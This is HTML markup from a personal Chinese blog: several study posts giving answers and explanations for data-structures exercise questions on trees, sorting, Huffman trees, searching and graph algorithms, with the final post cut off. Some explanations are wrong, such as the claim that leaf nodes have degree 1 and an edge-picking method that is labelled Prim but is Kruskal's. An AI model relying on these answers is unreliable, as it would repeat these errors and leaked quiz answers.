+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>某二叉树的后序和中序遍历序列正好一样，则该二叉树中的任何结点一定都无右孩子。</strong><br><strong>某二叉树的后序和中序遍历序列正好一样，则该二叉树中的任何结点一定都无左孩子。</strong><br>答案为<em>T</em>和<em>F</em>，可以这样来想哈，后序的话我们可以写作（left）（right）（根），中序的话我们可以写作（left）（根）（right），令二者相等    即可得到（right）=null</p>
+<p><strong>若A和B都是一棵二叉树的叶子结点，则存在这样的二叉树，其前序遍历序列为…A…B…，而中序遍历序列为…B…A…</strong><br>答案为<em>F</em>，根据上面的方法我们将（根）=NULL，可以看到，不管是什么的遍历方法，结点为叶的情况下，顺序都是一样的</p>
+<p><strong>若一个结点是某二叉树的中序遍历序列的最后一个结点，则它必是该树的前序遍历序列中的最后一个结点。 (2分)</strong><br>答案为<em>F</em>，考虑特殊情况，c为根，d为left，中序为dc，前序为cd</p>
+<p><strong>如果一棵非空k（k≥2）叉树T中每个非叶子结点都有k个孩子，则称T为正则k叉树。若T的高度为h（单结点的树h=1），则T的结点数最多为：(3分)</strong><br><strong>如果一棵非空k（k≥2）叉树T中每个非叶子结点都有k个孩子，则称T为正则k叉树。若T的高度为h（单结点的树h=1），则T的结点数最少为：(3分)</strong>答案为<em>(k的h次方−1)/(k−1)</em>，<em>k(h−1)+1</em>，最多的时候很好想，就是每层都是上一层的k倍，也就是1、k、k^2^…所以也就是个等比数列，列公式就完事了。至于最少的情况就是从第二层开始就只有一个结点有孩子，那么也就是1+k+k+k+…+k个（注意这里的应该有h-1个k，因为第一层只有一个），所以答案是k(h-1)+1啦</p>
+<p><strong>1-5若一个结点是某二叉树的中序遍历序列的最后一个结点，则它必是该树的前序遍历序列中的最后一个结点。</strong></p>
+<p>中序序列即（left）根（right），先序序列是根（left）（right），最后一个结点都是right…吗？当然不是啦，你的right可别忘了还是个树，也就是说可能存在之后还存在上述的结构，而当我们在right树中如果没有下一个right的话，就会出现中序是（left）根，而前序是根（left）的情况，这就完蛋了。</p>
+<p><strong>1-7已知一棵二叉树的先序遍历结果是ABC,　则CAB不可能是中序遍历结果。</strong></p>
+<p>答案是T，先序遍历可以确定的是A为根结点，而B、C的位置是不确定的，可以归纳为2种情况</p>
+<ul>
+<li>B、C都为叶子，那么根据我们上面的小技巧，B、C相对位置不能发生改变，所以不对</li>
+<li>B、C不都为叶子，那么再次按照先序，B为子树的根结点，树就确认了，发现其中序遍历也不是CAB</li>
+</ul>
+<p><strong>2-3要使一棵非空二叉树的先序序列与中序序列相同，其所有非叶结点须满足的条件是：</strong></p>
+<p>还是老办法，依照题意有：根（left）（right） == （left）根（right），也就是left=0，所以不能有左子树，答案为只有右子树</p>
+<p><strong>2-4已知一棵二叉树的树形如下图所示，其后序序列为{ <code>e</code>, <code>a</code>, <code>c</code>, <code>b</code>, <code>d</code>, <code>g</code>, <code>f</code> }。树中与结点<code>a</code>同层的结点是：</strong></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fycdiqfoa5j308g062jrv.jpg" alt=""></p>
+<p>首先，先用自己的字母填充满所有的顶点，然后自己拿后序遍历一遍，然后一一对应填入，之后就随便做了</p>
+<p><strong>2-5</strong></p>
+<p><strong>在下述结论中，正确的是： (2分)</strong></p>
+<p><strong>① 只有2个结点的树的度为1；</strong></p>
+<p><strong>② 二叉树的度为2；</strong></p>
+<p><strong>③ 二叉树的左右子树可任意交换；</strong></p>
+<p><strong>④ 在最大堆（大顶堆）中，从根到任意其它结点的路径上的键值一定是按非递增有序排列的。</strong></p>
+<p>1是正确的，不说了；2显然不对，叶结点的度是1；3不对；4很对</p>
+<p><strong>2-7如果一棵非空k（k≥2）叉树T中每个非叶子结点都有k个孩子，则称T为正则k叉树。若T有m个非叶子结点，则T中的叶子结点个数为：</strong></p>
+<p>这个题目要用到之前总结的知识了，我们设该树有h+1层，由于树为k叉树，所以其叶结点的个数为k的h次方，那么我们忽略所有的叶结点，剩余的树依然是k叉树，其结点数也就等于m（题目条件），那么由之前总结的公式得到 (k的h次方−1)/(k−1) == m，解得k的h次方也就等于m(k−1)+1</p>
+<p><strong>2-8有一个四叉树，度2的结点数为2，度3的结点数为3，度4的结点数为4。问该树的叶结点个数是多少？</strong></p>
+<p>这题可以用个小技巧，结点+边法，我们设结点数为x，由于树的性质可知边个数为x-1，设叶结点的个数为y，那么可列方程：x == y + 2 + 3 + 4    y == 2x2 + 3x3 + 4x4 + x*0，解方程就完事了</p>
+<p><strong>2-11任何一棵二叉树的叶结点在先序、中序和后序遍历序列中的相对次序</strong></p>
+<p>不发生改变，上边证明过了</p>
+<p><strong>2-12二叉树中第5层（根的层号为1）上的结点个数最多为：</strong></p>
+<p>其实这个上面的题目用到过这个知识点了，最多就是k的h-1次方，k是k叉树，h是高度</p>
+<p><strong>2-19设高为h的二叉树（规定叶子结点的高度为1）只有度为0和2的结点，则此类二叉树的最少结点数和最多结点数分别为</strong></p>
+<p>一看就可以看出这其实就是之前的k叉树的最多最少结点问题，公式推过了，不再说了</p>
+<p>successful，估计明天会更新排序，有时间的话还有更新树、森林、哈夫曼树，希望能在是考试前全部更新完吧，这样之后就可以好好更新别的内容啦</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/21/数据结构基础-排序/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/21/数据结构基础-排序/" itemprop="url">数据结构基础--排序</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-21T18:16:46+08:00">
+                2018-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>1-1对N个记录进行堆排序，需要的额外空间为O(N)。</strong></p>
+<p>这是错的，其实只需要记录temp的一个，也就是O(1)，这里给个统计好的表</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyejgnvnd4j310z0u0dsf.jpg" alt=""></p>
+<p><strong>1-2对N个记录进行简单选择排序，比较次数和移动次数分别为O(N2)和O(N)。</strong></p>
+<p>这个对的，选择排序的时间基本都浪费在比较上了。。。</p>
+<p><strong>1-3希尔排序是稳定的算法。 (1分)</strong></p>
+<p>最不稳定的还差不多</p>
+<p><strong>1-5对N个记录进行归并排序，归并趟数的数量级是O(NlogN)。</strong></p>
+<p>上面总结的表里给了</p>
+<p><strong>2-1对一组包含10个元素的非递减有序序列，采用直接插入排序排成非递增序列，其可能的比较次数和移动次数分别是</strong></p>
+<p>直接插入排序每回合的比较次数和元素移动次数等于其原始位置和插入位置之间的偏移。最好情况下（有序），需要比较(n-1)次，移动0次；最差情况下，需要比较1+2+…+(n-1)=n(n-1)/2次，移动n(n-1)/2次。所以答案都要小于50</p>
+<p><strong>2-2设有1000个元素的有序序列，如果用二分插入排序再插入一个元素，则最大比较次数是</strong></p>
+<p>log~2~N，不再重复了</p>
+<p><strong>2-3用直接插入排序方法对下面四个序列进行排序（由小到大），元素比较次数最少的是（）。</strong></p>
+<p>逆序对越少比较次数越少</p>
+<p><strong>2-4在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左右指针都会停止移动，那么当所有元素都相等时，算法的时间复杂度是多少</strong>2-5</p>
+<p><strong>在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左右指针都不停止移动，那么当所有元素都相等时，算法的时间复杂度是多少？</strong></p>
+<p><strong>在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左指针停止移动，而右指针在同样情况下却不停止移动，那么当所有元素都相等时，算法的时间复杂度是多少？</strong></p>
+<p>推荐记住吧。。都停止是O(NlogN)，不停止的话就是O(N^2^)</p>
+<p><strong>2-7对N个不同的数据采用冒泡算法进行从大到小的排序，下面哪种情况下肯定交换元素次数最多？</strong></p>
+<p>答案就是。。。完全反着的呗</p>
+<p><strong>2-8对于7个数进行冒泡排序，需要进行的比较次数为：</strong></p>
+<p>冒泡最差就是7+6+5+4+3+2+1，也就是21，其实就是等差数列的公式，n(n-1)/2</p>
+<p><strong>2-9有组记录的排序码为{ 46，79，56，38，40，84 }，则利用堆排序的方法建立的初始堆为：</strong></p>
+<p>简单说一下怎么建立初始堆，首先将给的记录按照层序构建一个完全二叉树，接着进行调整（以大顶堆为例）</p>
+<ul>
+<li><p>自己最大，不用调整</p>
+</li>
+<li><p>左孩子最大，交换该非叶结点与其左孩子的值，并考察以左孩子为根的子树是否满足大顶堆的要求，不满足递归向下处理</p>
+</li>
+<li><p>右孩子最大，交换该非叶结点与其右孩子的值，并考察以右孩子为根的子树是否满足大顶堆的要求，不满足递归向下处理</p>
+</li>
+</ul>
+<p><strong>2-10采用递归方式对顺序表进行快速排序，下列关于递归次数的叙述中，正确的是：</strong></p>
+<p>递归次数与每次划分后得到的分区处理顺序无关</p>
+<p><strong>2-11对N个记录进行快速排序，在最坏的情况下，其时间复杂度是：</strong></p>
+<p>上面的表中给出了，不再多说</p>
+<p><strong>2-12有组记录的排序码为{46，79，56，38，40，84 }，采用快速排序（以位于最左位置的对象为基准而）得到的第一次划分结果为：</strong></p>
+<blockquote>
+<p>base = 46</p>
+<ol>
+<li>i = 0; j = 5<br>此时 46, 79, 56, 38, 40, 84<br>从右往左找比base小的数，如果找到，则替换i处的值 </li>
+<li>i = 0; j = 4<br>此时 40， 79，56，38，40，84<br>从左往右找比base大的数，如果找到，则替换j处的值 </li>
+<li>i = 1;j = 4<br>此时 40， <strong>79</strong>，56，38，<strong>79</strong>，84<br>从右往左找比base小的数，如果找到，则替换i处的值 </li>
+<li>i = 1;j = 3<br>此时 40， 38，56，38，79，84<br>从左往右找比base大的数，如果找到，则替换j处的值 </li>
+<li>i = 2;j = 3<br>此时 40， 38，56，56，79，84</li>
+<li>i=2 处填上base值46<br>此时 40， 38，46，56，79，84<br>选C</li>
+</ol>
+</blockquote>
+<p><strong>2-13对于序列{ 49，38，65，97，76，13，27，50 }，按由小到大进行排序，下面哪一个是初始步长为4的希尔排序法第一趟的结果？</strong></p>
+<p>希尔排序应该说是亲民的一种排序了。。。代码亲民，选择做起来也不难。下面来简单说一下希尔排序的过程。</p>
+<p>首先选择len/2作为增了，然后前len/2个分别和后len/2个一一对应算是一组，然后这俩组成的一组进行比较交换。</p>
+<p>第二步让增量/2得到新的增量，然后重复上面的操作，直至增量为1，进行最后一次排序</p>
+<p><strong>2-14给定初始待排序列{ 15，9，7，8，20，-1，4 }。如果希尔排序第一趟结束后得到序列为{ 15，-1，4，8，20，9，7 }，则该趟增量为</strong></p>
+<p>会了希尔排序之后这个就很简单了</p>
+<p><strong>2-16对于10个数的简单选择排序，最坏情况下需要交换元素的次数为：</strong></p>
+<p>就是每两个都得交换，也就是9次</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/20/数据结构基础-树、森林、哈夫曼树/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/20/数据结构基础-树、森林、哈夫曼树/" itemprop="url">数据结构基础--树、森林、哈夫曼树</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-20T17:10:41+08:00">
+                2018-12-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>今天上了一天的数电。。。明明本来没那么多课的，结果硬生生加了好几节。。。估计今天更不了排序了，先把树这部分搞完吧</p>
+<p><strong>1-1对于一个有N个结点、K条边的森林，不能确定它共有几棵树。</strong></p>
+<p>答案是F，这个其实是可以算出来的，我们在图中说过树是边最少的一种连通图了，其边数（下文中边数用e数代替）== 结点数（下文中用v数代替）-1，所以我们就知道了， N - K的差值就是树的个数了</p>
+<p><strong>1-2对N（≥2）个权值均不相同的字符构造哈夫曼树，则树中任一非叶结点的权值一定不小于下一层任一结点的权值。</strong></p>
+<p>这个是对的因为构造哈夫曼树的时候就是每次拿出最小的来一层层搭建的，而且每一次搭建的上一层都是下边两个的和，所以其实非叶结点的权值都是要大于等于下一层结点的值的</p>
+<p><strong>2-1具有1102个结点的完全二叉树一定有__个叶子结点。</strong></p>
+<p>这个之前也用过了，就是2n（2n是总的v数）/2个，至于为啥，我们拿1到2n依照层序遍历好所有的v，自然最后一层的最后一个也就是2n，而由于是完全二叉树，最后一层的结点数除以2也就是之前一层的结点数，也就是说上一层v的最后一个就是n，那么最后一层的第一个就是n+1……一直到2n，就是n个。</p>
+<p><strong>2-2若森林F有15条边、25个结点，则F包含树的个数是：</strong></p>
+<p>上面说过了，就是v-e</p>
+<p><strong>2-3将森林转换为对应的二叉树，若在二叉树中，结点u是结点v的父结点的父结点，则在原来的森林中，u和v可能具有的关系是： (3分)</strong></p>
+<ol>
+<li><strong>父子关系； 2. 兄弟关系； 3. u的父结点与v的父结点是兄弟关系</strong></li>
+</ol>
+<p>答案是1和3，首先我们要知道森林是怎么变成二叉树的，这里也顺便详细总结一下几种常见的转换吧</p>
+<ul>
+<li><p>树转换为二叉树，简单说就是三步，加线、去线、转圈。首先把所有的兄弟结点都加上线，接着把非叶结点只保留与第一个孩子的结点，其他全部去掉，然后调整到一个比较好看的角度就完了</p>
+</li>
+<li><p>森林转换为二叉树，这个也很简单，首先把所有的树都变成二叉树，然后下一棵树都变成上一棵树的右儿子就完事了</p>
+</li>
+</ul>
+<p><strong>2-4对于一个有N个结点、K条边的森林，共有几棵树？</strong></p>
+<p>N-K，上面详细说过了。</p>
+<p><strong>2-5设森林F中有三棵树，第一、第二、第三棵树的结点个数分别为M1，M2和M3。则与森林F对应的二叉树根结点的右子树上的结点个数是：</strong></p>
+<p>这个就是上面提到的那个森林变二叉树的过程，实际上是M3成了M2的右子树，M2成了M1的右子树，所以右子树的结点个数应该是M2+M3</p>
+<p><strong>2-6由若干个二叉树组成的森林F中，叶结点总个数为N，度为2的结点总个数为M，则该集合中二叉树的个数为：</strong></p>
+<p>设有x个二叉树，度为1的结点为v，边数为e，根据之前推出来的结论有 x = n + m + v - e，对于边数e还有e = 2*m + v，连立得x = n - m</p>
+<p><strong>2-7已知一棵完全二叉树的第6层（设根为第1层）有8个叶结点，则该完全二叉树的结点个数最多是</strong></p>
+<p><strong>附加题 已知一棵完全二叉树的第6层（设根为第1层）有8个叶结点，则该完全二叉树的结点个数最少是</strong></p>
+<p>对于题目中的完全二叉树来说，最起码前五层都是满的，所以就是上次总结的等比数列求和公式2的五次方-1除以2-1，也就是31，而第六层就有故事了（因为完全二叉树的叶结点只有可能出现在最后一层和倒数第二层）</p>
+<ul>
+<li><p>第六层就是最后一层，那就是31 + 8 = 39了，也就是最少的情况</p>
+</li>
+<li><p>第六层是倒数第二层，那么就是有8个结点到头了，往下不能延伸了，但剩下的2的五次方-8个顶点还是可以继续往下走的，所以就是第七层还有48个结点，加起来就是最多的情况了</p>
+</li>
+</ul>
+<p><strong>2-8在一个用数组表示的完全二叉树中，如果根结点下标为1，那么下标为17和19这两个结点的最近公共祖先结点在哪里（数组下标）？ （注：两个结点的“公共祖先结点”是指同时都是这两个结点祖先的结点）</strong></p>
+<p>来看一下二叉树在数组中常见的几种查找。设结点的序列为index（假设根结点为0），那么他的左儿子也就是2*index+1，他的右儿子也就是2*index+2，而他的父亲就是(index-1)/2。</p>
+<p>题目中因为根结点是1，我们提前一格，所求的就是16和18，根据公式得7和8，再求一次得3，因为我们index提前了一格，所以再加1，答案就是4了</p>
+<p><strong>2-9具有65个结点的完全二叉树其深度为（根的深度为1）</strong></p>
+<p>记住公式就完事了，深度k =[log~2~N] + 1（注意要向下取整）</p>
+<p><strong>2-10对N（N≥2）个权值均不相同的字符构造哈夫曼树。下列关于该哈夫曼树的叙述中，错误的是：</strong></p>
+<p>当一棵具有n 个叶子结点的二叉树的WPL 值为最小时，称其树为哈夫曼树，其二叉树的形状是唯一的</p>
+<blockquote>
+<p>哈夫曼树的形态不是唯一的，但是它的带权路径长度WPL是唯一的。 </p>
+<p>如：3，5，6 </p>
+<p>可以构造出 </p>
+<p>​        14</p>
+<p>​      8          6</p>
+<p>3    5</p>
+<p>或   </p>
+<p>​       14</p>
+<p>​     6         8 </p>
+<p>​              3    5</p>
+<p>这两种形态，所以哈夫曼树形态不唯一。</p>
+</blockquote>
+<p><strong>2-18(neuDS)在哈夫曼树中，任何一个结点它的度都是（ ）</strong></p>
+<p>0或者2，因为，这很好想吧，因为我们都是拿两个结点拼起来的</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/18/数据结构基础-查找/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/18/数据结构基础-查找/" itemprop="url">数据结构基础--查找</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-18T21:01:18+08:00">
+                2018-12-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>2-1已知一个长度为16的顺序表L，其元素按关键字有序排列。若采用二分查找法查找一个L中不存在的元素，则关键字的比较次数最多是</strong></p>
+<p>我们知道折半查找就相当于是建立了一个二叉树，然后去搜索相应的叶子，那么查询的次数最多就应该是树的</p>
+<p>高度，也就是log~2~n+1，答案就是5了</p>
+<p><strong>2-2用二分查找从100个有序整数中查找某数，最坏情况下需要比较的次数是</strong></p>
+<p>和上个题一样，其实就是log~2~n+1，注意这里的log~2~n要向下取整也就是6</p>
+<p><strong>2-3在有n（n&gt;1000）个元素的升序数组<code>A</code>中查找关键字x。查找算法的伪代码如下所示：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">k = 0</span><br><span class="line">while ( k&lt;n 且 A[k]&lt;x )  k = k+3;</span><br><span class="line">if ( k&lt;n 且 A[k]==x )  查找成功;</span><br><span class="line">else if ( k-1&lt;n 且 A[k-1]==x ) 查找成功;</span><br><span class="line">     else if ( k-2&lt;n 且 A[k-2]==x ) 查找成功;</span><br><span class="line">          else 查找失败;</span><br></pre></td></tr></table></figure>
+<p>看算法，就是个简单的顺序查找，只不过是3个一组罢了。想象你要找的元素是第二个，因为折半查找先找中间，而你顺序查找的话一下子就找到了。所以答案很明显应该是前几个元素。</p>
+<p><strong>2-4下列二叉树中，可能成为折半查找判定树（不含外部结点）的是：</strong></p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fyc4flh0lrj30fq0lkwib.jpg" alt=""></p>
+<p>折半查找二叉树要注意，他的中序遍历是一个有序序列（升序的），但是折半就有个问题了，你是向上取整呢，还是向下取整呢？一般我们都是向下取整的，但其实这两种情况都可以，不过两种情况的二叉树在当顶点数是偶数时就会出现左右分配不均匀的情况，就会存在差异。</p>
+<ul>
+<li>当向上取整时，左多右少</li>
+<li>当向下取整时，左少右多</li>
+</ul>
+<p>做这种题目关键就是看他们的取整策略是否相同，这里有个小技巧，高度对称的一定不是，比如b、c。而d呢？根结点左是4，右是5，也就是向下取整，在看左子树的根结点，左2右1，是向上取整，矛盾所以错误。</p>
+<p><strong>2-5若二叉搜索树是有N个结点的完全二叉树，则不正确的说法是：</strong></p>
+<p>查找效率之前说过了就是logN，最小值一定在叶结点上也是对的，但最大却不一定在叶结点上，还有可能是中间。</p>
+<p><strong>2-6若一棵二叉树的后序遍历序列是{ 1, 3, 2, 6, 5, 7, 4 }，中序遍历序列是{ 1, 2, 3, 4, 5, 6, 7 }，则下列哪句是错的</strong></p>
+<p>这个就不说了，还原出来树就很简单了，怎么还原？先看后序，后序的最后一个是根结点，再看中序，中序中以根结点为mid分成两部分，左是左子树，右是右子树，重复上面的过程即可</p>
+<p><strong>2-10对二叉搜索树进行什么遍历可以得到从小到大的排序序列？</strong></p>
+<p>这个之前说那个折半查找树的时候说过了，中序（因为左一定小于中，右一定大于中）。</p>
+<p>其余的题目都是类似的或者是重复的，就不再说了（其实是今天还要被逼更新二叉树，来不及写了），successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/16/数据结构基础-图（下）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/16/数据结构基础-图（下）/" itemprop="url">数据结构基础--图（下）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-16T21:24:05+08:00">
+                2018-12-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>1-1在一个有权无向图中，若b到a的最短路径距离是12，且c到b之间存在一条权为2的边，则c到a的最短路径距离一定不小于10。</strong><br>这肯定是对的，a-b最小是12的话，假设a-c最小是x，那么x+2>=12（为啥？因为你经过c到b的距离不可能大于最短路径）</p>
+<p><strong>2-1我们用一个有向图来表示航空公司所有航班的航线。下列哪种算法最适合解决找给定两城市间最经济的飞行路线问题？</strong><br>两城市之间最短路径问题用Dijkstra算法喽</p>
+<p><strong>2-2数据结构中Dijkstra算法用来解决哪个问题？</strong><br>重复做题，最为致命。</p>
+<p><strong>2-3若要求在找到从S到其他顶点最短路的同时，还给出不同的最短路的条数，我们可以将Dijkstra算法略作修改，增加一个count数组：count v记录S到顶点V的最短路径有多少条。则count v应该被初始化为：</strong><br>count s=1;对于其他顶点V则令count v=0，很简单嘛，自己和自己的最短路径就不用再考虑了。</p>
+<p><strong>2-4使用迪杰斯特拉（Dijkstra）算法求下图中从顶点1到其他各顶点的最短路径，依次得到的各最短路径的目标顶点是</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fy8x1x0zvgj30k208uabi.jpg" alt=""><br>最好是拿张纸画一画，挺简单。从1点开始有两条路，更新到v2和v5的距离，然后到v5的距离4小于到v2的距离5，所以在从v5开始重复操作，最后等所有的都遍历过来了就完事了，然后看看是谁先变为最短路径的，列出来即可</p>
+<p><strong>2-5在一个有权无向图中，如果顶点b到顶点a的最短路径长度是10，顶点c与顶点b之间存在一条长度为3的边。那么下列说法中有几句是正确的？</strong></p>
+<ul>
+<li>c与a的最短路径长度就是13</li>
+<li>c与a的最短路径长度就是7</li>
+<li>c与a的最短路径长度不超过13</li>
+<li>c与a的最短路径不小于7</li>
+</ul>
+<p>这题和第一个简直是一个模子刻出来的，还是列个不等式先，设a-c为x，那么x+3>=10（为什么前面说过一次了），得到x大于等于7，这是一种情况，那x最大是几呢？因为a-b的最短定了，b-c定了，所以最大就是10 + 3 = 13了，所以这里有两句话正确<br><strong>2-6给定有权无向图的邻接矩阵如下，其最小生成树的总权重是：</strong><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fy8xdnjlq1j30ca088weu.jpg" alt=""><br>呃，千万别还原图，直接画一下最小生成树就好了，什么，不会？Prime算法和Kruskal算法了解一下，这里就选简单的Prime算法说吧<br>首先我们根据邻接矩阵的值取最短的边放入我们的最小生成树，每次都取最小的边，如果和之前的构成回路了就舍弃掉，这样最后连通起来，就得到了最小生成树啦</p>
+<p><strong>2-9给定有权无向图如下。关于其最小生成树，下列哪句是对的？</strong><br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyb16bn7xyj30j60e60xs.jpg" alt=""></p>
+<ul>
